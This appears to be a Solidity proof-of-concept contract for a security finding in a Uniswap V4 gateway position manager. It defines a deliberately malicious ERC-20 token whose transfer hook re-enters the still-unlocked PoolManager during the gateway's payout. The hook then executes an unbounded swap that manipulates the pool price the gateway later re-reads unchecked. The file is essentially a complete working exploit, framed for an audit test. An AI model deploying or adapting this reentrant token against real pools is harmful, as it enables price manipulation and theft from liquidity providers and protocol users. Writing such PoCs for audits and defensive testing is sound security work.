// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";

/// @notice PoC for `MintwareLpGatewayPositionManager.deploy()`'s missing post-swap band re-check
///         (contracts-v4/src/gateway/MintwareLpGatewayPositionManager.sol:772). This IS the paired
///         asset of a gateway-curated pool — it behaves as an ordinary ERC-20 for every transfer EXCEPT
///         the one that matters: when the real V4 `PoolManager` pays this token OUT to the gateway
///         (`poolManager.take(pairedCurrency, gatewayPM, amount)` inside `deploy()`'s own
///         `_swapExactIn`/`take`), `_update` hijacks control WHILE the PoolManager is still globally
///         unlocked (Uniswap V4's `onlyWhenUnlocked` gate checks only a single boolean, never caller
///         identity — see PoolManager.sol `Lock.isUnlocked()` / `onlyWhenUnlocked`), and fires a SECOND,
///         completely unbounded swap directly against the SAME pool before returning control to the
///         gateway. The gateway's own swap stays inside its price-limited bound; the interleaved one does
///         not, and `slot0.sqrtPriceX96` is pool-level state — `deploy()`'s post-swap re-read at line 772
///         picks up the manipulated price with no re-check against the deviation band it enforced before
///         the first swap.
contract MaliciousReentrantPairedToken is ERC20 {
    IPoolManager public immutable poolManager;

    PoolKey private _poolKey;
    address private _gatewayPM;
    IERC20 private _quote;
    bool private _quoteIsCurrency0;
    uint256 private _attackAmountIn;

    bool public armed;
    bool private _inAttack;
    bool public fired; // set once the interleaved swap actually executed — lets the test assert it ran

    constructor(address poolManager_) ERC20("Malicious Paired", "EVIL") {
        poolManager = IPoolManager(poolManager_);
    }

    function decimals() public pure override returns (uint8) {
        return 18;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    /// @dev Wired up once the pool/gateway exist. `attackAmountIn` is denominated in the QUOTE asset
    ///      (this contract must already hold at least that much — a hostile token can trivially fund
    ///      itself via a privileged mint/rebase; here it is simply pre-funded in the test for clarity).
    function configure(PoolKey memory key, address gatewayPM, IERC20 quote_, bool quoteIsCurrency0_, uint256 attackAmountIn)
        external
    {
        _poolKey = key;
        _gatewayPM = gatewayPM;
        _quote = quote_;
        _quoteIsCurrency0 = quoteIsCurrency0_;
        _attackAmountIn = attackAmountIn;
    }

    function arm(bool a) external {
        armed = a;
    }

    /// @dev The hijack point. `from == address(poolManager)` only when the PoolManager itself is the one
    ///      moving this token — i.e. exactly the `currency.transfer(to, amount)` inside `PoolManager.take`
    ///      (PoolManager.sol: `_accountDelta(...); currency.transfer(to, amount);`). Gated to `to ==
    ///      _gatewayPM` so it fires on the gateway's OWN outbound leg, not on the attack swap's own
    ///      follow-up `take()` a few lines below (which would otherwise recurse).
    function _update(address from, address to, uint256 value) internal override {
        super._update(from, to, value);
        if (armed && !_inAttack && from == address(poolManager) && to == _gatewayPM) {
            _inAttack = true;
            _attack();
            _inAttack = false;
        }
    }

    /// @dev Sells `_attackAmountIn` of quote for paired directly against the gateway's own pool, with a
    ///      fully unbounded `sqrtPriceLimitX96` — no deviation band, because this contract is not the
    ///      gateway and answers to no such check. This is the interleaved swap the finding describes.
    function _attack() private {
        bool zeroForOne = _quoteIsCurrency0;
        uint160 limit = zeroForOne ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1;

        BalanceDelta delta = poolManager.swap(
            _poolKey,
            SwapParams({zeroForOne: zeroForOne, amountSpecified: -int256(_attackAmountIn), sqrtPriceLimitX96: limit}),
            ""
        );

        int128 d0 = delta.amount0();
        int128 d1 = delta.amount1();
        if (d0 < 0) _pay(_poolKey.currency0, uint256(uint128(-d0)));
        else if (d0 > 0) poolManager.take(_poolKey.currency0, address(this), uint256(uint128(d0)));
        if (d1 < 0) _pay(_poolKey.currency1, uint256(uint128(-d1)));
        else if (d1 > 0) poolManager.take(_poolKey.currency1, address(this), uint256(uint128(d1)));

        fired = true;
    }

    function _pay(Currency currency, uint256 amount) private {
        poolManager.sync(currency);
        IERC20(Currency.unwrap(currency)).transfer(address(poolManager), amount);
        poolManager.settle();
    }
}
